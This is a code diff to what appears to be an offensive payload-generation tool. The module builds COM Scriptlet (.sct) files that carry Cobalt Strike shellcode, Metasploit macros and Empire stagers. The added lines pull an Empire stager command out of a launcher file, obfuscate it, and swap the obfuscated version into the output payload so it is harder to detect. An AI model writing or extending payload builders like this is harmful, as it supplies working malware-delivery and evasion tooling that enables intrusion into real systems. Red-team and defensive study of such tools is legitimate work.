@@ -10,6 +10,7 @@ from sys import exit
 from encoder import *
 import itertools
 from decoder import decodeChrArray
+from invokeObfuscation import invokeObfuscation
 
 '''
 This module is used for generating COM Scriptlet payloads.
@@ -39,7 +40,7 @@ def genProgID(size=8, chars=ascii_uppercase + digits):
 
 	return progid
 
-def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
+def genSCT(framework, stagingMethod, redirector, x86, x64, payload='cs.sct'):
 	'''
 	Generates a COM Scriptlet payload aka sct file.
 
@@ -53,7 +54,7 @@ def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
 	'''
 	# try:
 	if 'Cobalt' in framework:
-		csShellCode = getCobaltStrikeShellCode(cspayload)
+		csShellCode = getCobaltStrikeShellCode(payload)
 		genVBAMacro('payload.sct', stagingMethod, csShellCode, x86, x64)
 	elif 'Metasploit' in framework:
 		if 'Excel' in stagingMethod:
@@ -65,7 +66,17 @@ def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
 		else:
 			print('[-] ERROR: VBAMacro method is not supported. Exiting.')
 			exit()
-
+	elif 'Empire' in framework:
+		payload = 'launcher.sct'
+		copyfile(payload, 'payload.sct')
+		empirePayload = getEmpireStager(payload)
+		print(empirePayload)
+		obfuscatedPayload = invokeObfuscation(empirePayload)
+		if "Length" in obfuscatedPayload:
+			print('Command is too long for cmd.exe')
+			exit()
+		else:
+			fileFindReplace('payload.sct', empirePayload, obfuscatedPayload)
 	else:
 		print('{0} framework is not supported yet'.format(framework))
 	# except TypeError:
@@ -186,3 +197,16 @@ def getCobaltStrikeShellCode(cspayload):
 	csShellCode = ''.join(line[0] for line in shellCode)
 
 	return csShellCode
+
+def getEmpireStager(empireStager):
+
+	payload = ''
+
+	for line in open(empireStager, 'r'):
+		if 'Run' in line:
+			payload += line
+
+	empirePayload = re.search(r'(Run\("(.+\s+.+)")', payload)
+
+	return empirePayload.group()
+
